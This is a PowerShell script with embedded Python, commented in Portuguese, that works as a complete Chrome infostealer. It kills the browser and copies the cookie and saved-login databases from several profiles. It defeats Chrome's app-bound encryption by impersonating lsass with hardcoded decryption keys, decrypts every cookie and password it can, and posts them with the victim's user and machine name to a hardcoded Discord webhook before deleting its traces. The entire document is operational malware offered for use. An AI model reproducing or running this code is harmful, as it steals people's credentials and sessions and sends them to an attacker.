param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

l "=== Chrome v20 Extractor (runassu method) ==="
l "User: $env:USERNAME@$env:COMPUTERNAME"

# Verifica se é admin (necessário para impersonate lsass)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (!$isAdmin) {
    l "[AVISO] NAO esta rodando como ADMINISTRADOR!"
    l "[AVISO] O metodo runassu requer admin para impersonate lsass.exe"
    l "[*] Tentando mesmo assim..."
}

# Verifica se tem Python
$python = Get-Command python -ErrorAction SilentlyContinue
if (!$python) {
    l "[PYTHON] Python nao encontrado! Tentando python3..."
    $python = Get-Command python3 -ErrorAction SilentlyContinue
}
if (!$python) {
    l "[PYTHON] Python nao esta instalado!"
    l "[*] Tentando metodo alternativo..."
    # Fallback será chamado no final se nada funcionar
}

l "[PYTHON] Python encontrado: $($python.Source)"

# Mata Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# ============================================
# PASSO 1: Baixar o script Python do runassu
# ============================================
$scriptDir = "$env:TEMP\chrome_v20_decrypt"
if (Test-Path $scriptDir) { Remove-Item $scriptDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null

l "[DOWNLOAD] Baixando script decrypt do runassu..."

$scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/main/decrypt_chrome_v20_cookie.py"
$scriptPath = "$scriptDir\decrypt_chrome_v20_cookie.py"
$downloadOK = $false

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($scriptUrl, $scriptPath)
    $wc.Dispose()
    $downloadOK = $true
    l "[DOWNLOAD] Script baixado com sucesso"
} catch {
    l "[DOWNLOAD] Falha ao baixar: $($_.Exception.Message)"
    try {
        $scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/refs/heads/main/decrypt_chrome_v20_cookie.py"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($scriptUrl, $scriptPath)
        $wc.Dispose()
        $downloadOK = $true
        l "[DOWNLOAD] Sucesso na segunda tentativa"
    } catch {
        l "[DOWNLOAD] Todas as tentativas falharam: $($_.Exception.Message)"
    }
}

# ============================================
# PASSO 2: Instalar dependências Python
# ============================================
if ($downloadOK -and $python) {
    l "[PIP] Instalando dependencias Python..."
    
    $deps = @("windows", "cryptography", "pywin32", "pycryptodome")
    foreach ($dep in $deps) {
        l "[PIP] Instalando $dep..."
        try {
            $output = & $python -m pip install $dep -q 2>&1
            if ($LASTEXITCODE -ne 0) {
                l "[PIP] Erro codigo $LASTEXITCODE, tentando --user..."
                $output = & $python -m pip install $dep -q --user 2>&1
            }
            l "[PIP] $dep instalado"
        } catch {
            l "[PIP] Falha ao instalar $dep: $($_.Exception.Message)"
        }
    }
}

# ============================================
# PASSO 3: Copiar bancos de dados para evitar lock
# ============================================
l "[COPY] Copiando bancos de dados do Chrome..."

$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$tempDbDir = "$scriptDir\databases"
New-Item -ItemType Directory -Path $tempDbDir -Force | Out-Null

# Copia Local State
$localStateSrc = "$chromeUserData\Local State"
$localStateDst = "$tempDbDir\Local State"
if (Test-Path $localStateSrc) {
    Copy-Item $localStateSrc $localStateDst -Force
    l "[COPY] Local State copiado"
}

# Copia cookies de todos os perfis
$profiles = @('Default','Profile 1','Profile 2','Profile 3','Profile 4')
foreach ($prof in $profiles) {
    $cookieSrc = "$chromeUserData\$prof\Network\Cookies"
    $cookieSrc2 = "$chromeUserData\$prof\Cookies"
    $dstDir = "$tempDbDir\$prof"
    New-Item -ItemType Directory -Path $dstDir -Force -ErrorAction SilentlyContinue
    
    if (Test-Path $cookieSrc) {
        Copy-Item $cookieSrc "$dstDir\Cookies" -Force
        l "[COPY] Cookies de $prof (Network)"
    } elseif (Test-Path $cookieSrc2) {
        Copy-Item $cookieSrc2 "$dstDir\Cookies" -Force
        l "[COPY] Cookies de $prof (raiz)"
    }
    
    $loginSrc = "$chromeUserData\$prof\Login Data"
    if (Test-Path $loginSrc) {
        Copy-Item $loginSrc "$dstDir\Login Data" -Force
        l "[COPY] Login Data de $prof"
    }
}

# ============================================
# PASSO 4: Executar script integrado (evita dependência do download)
# ============================================
l "[EXEC] Gerando script integrado Python..."

$integratedPython = @'
import os, json, base64, sqlite3, io, struct, ctypes

try:
    import windows
    import windows.crypto
    import windows.generated_def as gdef
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    HAVE_DEPS = True
except ImportError as e:
    print("DEP_ERR: " + str(e))
    HAVE_DEPS = False

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def decrypt_v20(enc_val, mk):
    if not enc_val or len(enc_val) < 15: return None
    if enc_val[:3] == b"v20":
        iv = enc_val[3:15]
        ct = enc_val[15:-16]
        tg = enc_val[-16:]
        c = AESGCM(mk)
        d = c.decrypt(iv, ct + tg, None)
        return d[32:].decode("utf-8", errors="replace")
    elif enc_val[:3] == b"v11":
        iv = enc_val[3:15]
        ct = enc_val[15:-16]
        tg = enc_val[-16:]
        c = AESGCM(mk)
        d = c.decrypt(iv, ct + tg, None)
        return d.decode("utf-8", errors="replace")
    elif enc_val[:3] == b"v10":
        try:
            import win32crypt
            d = win32crypt.CryptUnprotectData(enc_val[3:], None, None, None, 0)
            return d[1].decode("utf-8", errors="replace")
        except: return None
    return None

def main():
    sd = SCRIPT_DIR
    if not HAVE_DEPS:
        print("NO_DEPS")
        return
    if not is_admin():
        print("NO_ADMIN")
    
    # Ler Local State
    ls_path = os.path.join(sd, "databases", "Local State")
    with open(ls_path, "r", encoding="utf-8") as f:
        ls = json.load(f)
    
    ak_b64 = ls["os_crypt"]["app_bound_encrypted_key"]
    ak_raw = base64.b64decode(ak_b64)
    assert ak_raw[:4] == b"APPB"
    ak_payload = ak_raw[4:]
    
    print("DPAPI_SYSTEM...")
    try:
        # Tenta com DPAPI normal primeiro (sem impersonate)
        d1 = windows.crypto.dpapi.unprotect(ak_payload)
    except:
        # Se falhar, tenta impersonate lsass
        print("Trying lsass impersonation...")
        orig_tok = windows.current_thread.token
        try:
            windows.current_process.token.enable_privilege("SeDebugPrivilege")
            for p in windows.system.processes:
                if p.name == "lsass.exe":
                    imp_tok = p.token.duplicate(type=gdef.TokenImpersonation, impersonation_level=gdef.SecurityImpersonation)
                    windows.current_thread.token = imp_tok
                    break
            d1 = windows.crypto.dpapi.unprotect(ak_payload)
        finally:
            windows.current_thread.token = orig_tok
    
    print("DPAPI_USER...")
    d2 = windows.crypto.dpapi.unprotect(d1)
    
    # Parse key blob
    buf = io.BytesIO(d2)
    hdr = struct.unpack("<I", buf.read(4))[0]
    chrome_path = buf.read(hdr).decode("utf-16-le", errors="replace")
    flag = struct.unpack("<B", buf.read(1))[0]
    iv = buf.read(12)
    ct = buf.read(32)
    tg = buf.read(16)
    rem = buf.read()
    
    print(f"FLAG={flag} CHROME={chrome_path[:40]}")
    
    if flag == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        c = AESGCM(aes_key)
        mk = c.decrypt(iv, ct + tg, None)
    elif flag == 2:
        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        c = ChaCha20Poly1305(chacha_key)
        mk = c.decrypt(iv, ct + tg, None)
    elif flag == 3 and rem:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        # Já está impersonado do DPAPI acima
        dk = windows.crypto.dpapi.unprotect(rem)
        xk = bytes(a ^ b for a, b in zip(dk, xor_key))
        c = AESGCM(xk)
        mk = c.decrypt(iv, ct + tg, None)
    else:
        print(f"UNSUPPORTED_FLAG {flag}")
        return
    
    print(f"MASTER_KEY={mk.hex()[:32]}...")
    with open(os.path.join(sd, "master_key.txt"), "w") as f:
        f.write(mk.hex())
    
    # Decrypt cookies
    all_cookies = []
    all_logins = []
    
    for prof in ["Default", "Profile 1", "Profile 2"]:
        dbd = os.path.join(sd, "databases", prof)
        cp = os.path.join(dbd, "Cookies")
        lp = os.path.join(dbd, "Login Data")
        
        if os.path.exists(cp):
            try:
                con = sqlite3.connect("file:" + cp + "?mode=ro", uri=True)
                rows = con.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies").fetchall()
                con.close()
                for r in rows:
                    ev = r[2]
                    if ev:
                        dv = decrypt_v20(ev, mk)
                        if dv:
                            all_cookies.append({"host": r[0], "name": r[1], "value": dv})
                print(f"PROF {prof}: {len(rows)} rows, {len(all_cookies)} decrypted cookies")
            except Exception as e:
                print(f"ERR cookies {prof}: {e}")
        
        if os.path.exists(lp):
            try:
                con = sqlite3.connect("file:" + lp + "?mode=ro", uri=True)
                rows = con.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins").fetchall()
                con.close()
                for r in rows:
                    ev = r[2]
                    if ev:
                        dv = decrypt_v20(ev, mk)
                        if dv:
                            all_logins.append({"url": r[0], "username": r[1], "password": dv})
                print(f"PROF {prof}: {len(rows)} login rows, {len(all_logins)} decrypted")
            except Exception as e:
                print(f"ERR logins {prof}: {e}")
    
    with open(os.path.join(sd, "cookies.json"), "w", encoding="utf-8") as f:
        json.dump(all_cookies, f, indent=2, ensure_ascii=False)
    with open(os.path.join(sd, "logins.json"), "w", encoding="utf-8") as f:
        json.dump(all_logins, f, indent=2, ensure_ascii=False)
    
    print(f"FINAL: {len(all_cookies)} cookies, {len(all_logins)} logins")

SCRIPT_DIR = r"__SCRIPT_DIR_PLACEHOLDER__"
main()
'@

$integratedPython = $integratedPython.Replace('__SCRIPT_DIR_PLACEHOLDER__', $scriptDir)
$integratedPath = "$scriptDir\integrated_decrypt.py"
[System.IO.File]::WriteAllText($integratedPath, $integratedPython, [System.Text.Encoding]::UTF8)

l "[EXEC] Executando script integrado Python..."
Push-Location $scriptDir

try {
    $output = & $python $integratedPath 2>&1
    $exitCode = $LASTEXITCODE
    
    l "[EXEC] Exit code: $exitCode"
    if ($output -is [array]) {
        foreach ($line in $output) { 
            if ($line -and $line.Length -gt 0) {
                l "[PYTHON] $line"
            }
        }
    } else {
        l "[PYTHON] $output"
    }
} catch {
    l "[EXEC] Exception: $($_.Exception.Message)"
}

Pop-Location

# ============================================
# PASSO 5: Coletar resultados e enviar
# ============================================
l "[RESULT] Coletando resultados..."

$allCookies = @()
$allLogins = @()
$masterKeyHex = ""

$cookiesFile = Join-Path $scriptDir "cookies.json"
$loginsFile = Join-Path $scriptDir "logins.json"
$keyFile = Join-Path $scriptDir "master_key.txt"

if (Test-Path $cookiesFile) {
    try {
        $allCookies = Get-Content $cookiesFile -Raw | ConvertFrom-Json
        l "[RESULT] Cookies lidos: $($allCookies.Count)"
    } catch { l "[RESULT] Erro lendo cookies.json: $($_.Exception.Message)" }
}

if (Test-Path $loginsFile) {
    try {
        $allLogins = Get-Content $loginsFile -Raw | ConvertFrom-Json
        l "[RESULT] Logins lidos: $($allLogins.Count)"
    } catch { l "[RESULT] Erro lendo logins.json: $($_.Exception.Message)" }
}

if (Test-Path $keyFile) {
    $masterKeyHex = Get-Content $keyFile -Raw
    l "[RESULT] Chave mestra: $($masterKeyHex.Substring(0, [Math]::Min(16, $masterKeyHex.Length)))..."
}

# Envia pro Discord
if ($allCookies.Count -gt 0 -or $allLogins.Count -gt 0) {
    $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
    $bodyLines = New-Object System.Collections.ArrayList
    
    [void]$bodyLines.Add("--$boundary")
    [void]$bodyLines.Add('Content-Disposition: form-data; name="payload_json"')
    [void]$bodyLines.Add("")
    
    $keyPreview = ""
    if ($masterKeyHex.Length -gt 0) {
        $keyPreview = $masterKeyHex.Substring(0, [Math]::Min(16, $masterKeyHex.Length))
    }
    $contentMsg = "Chrome v20 BYPASS | $env:USERNAME@$env:COMPUTERNAME | Cookies: $($allCookies.Count) | Logins: $($allLogins.Count) | Key: ${keyPreview}..."
    [void]$bodyLines.Add(("{0}" -f $contentMsg))
    
    if ($allCookies.Count -gt 0) {
        $cc = ($allCookies | ConvertTo-Json -Depth 3)
        [void]$bodyLines.Add("--$boundary")
        [void]$bodyLines.Add('Content-Disposition: form-data; name="file"; filename="cookies.json"')
        [void]$bodyLines.Add("Content-Type: application/json")
        [void]$bodyLines.Add("")
        [void]$bodyLines.Add($cc)
    }
    
    if ($allLogins.Count -gt 0) {
        $lc = ($allLogins | ConvertTo-Json -Depth 3)
        [void]$bodyLines.Add("--$boundary")
        [void]$bodyLines.Add('Content-Disposition: form-data; name="file"; filename="logins.json"')
        [void]$bodyLines.Add("Content-Type: application/json")
        [void]$bodyLines.Add("")
        [void]$bodyLines.Add($lc)
    }
    
    [void]$bodyLines.Add("--$boundary--")
    
    $bodyStr = $bodyLines -join "`r`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[DISCORD] Dados enviados com sucesso!"
    } catch { l "[FALHA] Discord: $($_.Exception.Message)" }
    
    # Salva local
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    if (Test-Path $cookiesFile) { Copy-Item $cookiesFile (Join-Path $out "cookies.json") -Force -ErrorAction SilentlyContinue }
    if (Test-Path $loginsFile) { Copy-Item $loginsFile (Join-Path $out "logins.json") -Force -ErrorAction SilentlyContinue }
    if (Test-Path $keyFile) { Copy-Item $keyFile (Join-Path $out "master_key.txt") -Force -ErrorAction SilentlyContinue }
    l "[SALVO] Resultados em $out"
} else {
    l "[FALHA] Nenhum dado extraido"
    
    # Fallback: salvar bancos brutos
    l "[*] Salvando bancos brutos para analise offline..."
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    if (Test-Path $tempDbDir) {
        Copy-Item "$tempDbDir\*" $out -Recurse -Force -ErrorAction SilentlyContinue
        l "[SALVO] Bancos copiados para $out"
    }
}

# Cleanup
if (Test-Path $scriptDir) { Remove-Item $scriptDir -Recurse -Force -ErrorAction SilentlyContinue }

l "=== CONCLUIDO ==="
